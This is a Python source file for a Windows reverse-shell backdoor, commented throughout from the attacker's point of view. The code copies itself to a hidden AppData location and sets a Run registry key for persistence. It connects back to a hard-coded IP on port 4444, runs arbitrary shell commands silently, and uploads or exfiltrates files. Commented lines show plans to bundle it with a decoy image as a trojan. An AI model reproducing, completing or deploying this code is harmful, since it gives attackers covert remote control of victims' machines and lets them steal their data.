import socket
import subprocess
import json
import os
import base64
import sys
import shutil


class Backdoor:

    def __init__(self, ip, port):

        # do this first, when the user runs the backdoor
        self.make_persistent()

        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # create a new socket with TCP connection

        # create a connection to hacker using port 4444 (reverse backdoor)
        # the argument is a tuple
        self.connection.connect((ip, port))

    # make the backdoor persistent by copying it into a hidden location that victim will not see
    def make_persistent(self):

        # shift to appdata folder. "os.environ["appdata"]" gets the directory of appdata
        hidden_location = os.environ["appdata"] + "\\backdoor.exe"

        if not os.path.exists(hidden_location):  # just copy the backdoor once to the hidden location
            shutil.copy(sys.executable, hidden_location)

            # execute the registry command to run backdoor each time the victim turns on computer
            subprocess.call('reg add HKCU\software\Microsoft\Windows\CurrentVersion\Run /v notsuspiciousfile /t REG_SZ /d "' + hidden_location + '"', shell=True)


    # send data back to hacker
    def reliable_send(self, data):

        json_data = json.dumps(data)  # convert the data into json object
        self.connection.send(json_data)  # send command to the victim.

    # receive data from hacker
    def reliable_receive(self):

        json_data = ''

        # keep calling recv until whole object is received
        while True:

            try:  # receive command/file from hacker
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)  # convert back to original object

            except ValueError:  # object is larger than 1024 bytes. keep calling recv
                continue

    def execute_system_command(self, command):

        # for python 2. prevent input and output from printing to console to keep backdoor hidden
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, universal_newlines=True, stderr=DEVNULL, stdin=DEVNULL)


    def change_working_directory(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    # read file on system and send to hacker
    def read_file(self, path):
        file = open(path, "rb")
        return base64.b64encode(file.read())  # encode to base64 to send jpg, pdf files

    # receive file from hacker and write to folder
    def write_file(self, path, content):

        file = open(path, "wb")  # create a new file to write the received data to
        file.write(base64.b64decode(content)) # decode base64 to original before writing
        return "[+] Upload successful!!!"

    # run the backdoor on the victim's computer. wait for commands from the hacker
    def run(self):

        while True:

            # Command is typed at hacker machine. Then execute the system command on the victim's computer.
            command_list = self.reliable_receive()

            try:
                # close the backdoor
                if command_list[0] == "exit":
                    self.connection.close()
                    sys.exit() # safe way to exit without any error messages

                # cd command. check if hacker wants to change directory and not just a 'cd' command
                elif command_list[0] == "cd" and command_list[1] != "":
                    command_result = self.change_working_directory(command_list[1])

                # read file, then send to hacker.
                elif command_list[0] == 'download':
                    command_result = self.read_file(command_list[1])

                # write the file received from hacker to the victim's computer
                elif command_list[0] == 'upload':
                    command_result = self.write_file(command_list[1], command_list[2])

                else:
                    command_result = self.execute_system_command(command_list)

            except Exception: # catch all exceptions. Continue running the backdoor at all costs
                command_result = "[-] Error during command execution"

            # send result of command back to hacker.
            self.reliable_send(command_result)


# the file location that the original file (the file that the victim wants) will be stored
# file_name = sys._MEIPASS + "\car.jpg"
# subprocess.Popen(file_name, shell=True)

# this will cause an error message to be popped up on victim's computer after running backdoor.exe, if backdoor is unable to connect to listener
# therefore exit the program silently if any error pops up
try:
    my_backdoor = Backdoor("192.168.1.140", 4444)
    my_backdoor.run()

except Exception:
    sys.exit()
